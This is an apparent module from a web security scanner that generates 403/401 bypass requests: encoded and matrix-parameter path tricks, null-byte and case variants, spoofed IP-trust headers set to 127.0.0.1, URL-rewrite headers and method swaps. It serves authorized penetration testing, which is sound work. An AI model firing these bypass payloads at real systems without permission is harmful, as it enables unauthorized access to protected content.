"""403/401 bypass fold (the nomore403 idea, built in).

A 403 means "exists but denied" — often a thin ACL that a path/header/method
trick walks around. When a 403/401 is found, this emits a curated set of bypass
variants (the same families nomore403/bypass-403 use); the scanner fires them and
a 2xx that survives soft-404 verification is reported as a real bypass, so the
report says which 403s actually hide content vs which are just a wall.

Each variant is (label, method, request_path, extra_headers). The set is
deduped and the no-op (GET of the original path with no headers) is never
emitted, so every variant is a genuinely different request.
"""

from __future__ import annotations

_IP_HEADERS = ("X-Forwarded-For", "X-Originating-IP", "X-Remote-IP", "X-Client-IP",
               "X-Real-IP", "X-Remote-Addr", "True-Client-IP", "Client-IP")


def _swapcase(p: str) -> str:
    return "/" + p.lstrip("/").swapcase()


def variants(path: str, case_insensitive: bool = False) -> list[tuple[str, str, str, dict]]:
    """Curated 403-bypass attempts for `path` (deduped, order = likelihood).

    `case_insensitive=True` (a Windows/IIS host, where the ACL ignores case too)
    drops the upper/swapcase path tricks — they'd hit the same resource and the
    same denial, so firing them just wastes the (WAF-throttled) budget.
    """
    p = "/" + path.lstrip("/")
    body = p.lstrip("/")
    out: list[tuple[str, str, str, dict]] = []
    seen: set[tuple] = set()

    def add(label: str, method: str, rpath: str, headers: dict) -> None:
        if not rpath:
            return
        # never emit the plain original request (it's the 403 we're bypassing)
        if method == "GET" and rpath == p and not headers:
            return
        key = (method, rpath, frozenset(headers.items()))
        if key in seen:
            return
        seen.add(key)
        out.append((label, method, rpath, headers))

    # --- path manipulation (GET, no extra headers) ---
    # Trailing tricks, dot/slash games, encoded separators, matrix params
    # (`;`/`..;/` — Tomcat/Spring), trailing whitespace/null, and extension
    # spoofs (defeat extension-based ACLs).
    path_muts = [
        p + "/", p + "/.", p + "//", p + "/./", "/./" + body,
        "/%2e/" + body, "/%2e" + p, p + "%2f", p + "..;/", p + ";/",
        p + "/..;/", p + ".;/", p + "%20", p + "%09", p + "%00",
        p + "?", p + ".json", p + ".html", "//" + body,
    ]
    if not case_insensitive:                       # pointless on a case-insensitive ACL
        path_muts += [p.upper(), _swapcase(p)]
    for m in path_muts:
        add(f"path {m}", "GET", m, {})

    # --- header injection (same path) ---
    # IP-trust headers (ACLs that allow localhost/internal), forwarded host/proto,
    # Referer (some rules trust same-origin), and the IIS/proxy URL-rewrite pair.
    for h in _IP_HEADERS:
        add(f"header {h}: 127.0.0.1", "GET", p, {h: "127.0.0.1"})
    add("header X-Custom-IP-Authorization: 127.0.0.1", "GET", p,
        {"X-Custom-IP-Authorization": "127.0.0.1"})
    add("header X-Forwarded-Host: localhost", "GET", p, {"X-Forwarded-Host": "localhost"})
    add("header X-Forwarded-Proto: http", "GET", p, {"X-Forwarded-Proto": "http"})
    add(f"header Referer: {p}", "GET", p, {"Referer": p})
    # X-Original-URL / X-Rewrite-URL: request root, point the header at the target
    add("header X-Original-URL", "GET", "/", {"X-Original-URL": p})
    add("header X-Rewrite-URL", "GET", "/", {"X-Rewrite-URL": p})

    # --- method swap (only verbs that can return the *content*; HEAD/OPTIONS
    # return no body and TRACE just echoes, so they'd be false bypasses) ---
    for meth in ("POST", "PATCH"):
        add(f"method {meth}", meth, p, {})

    return out
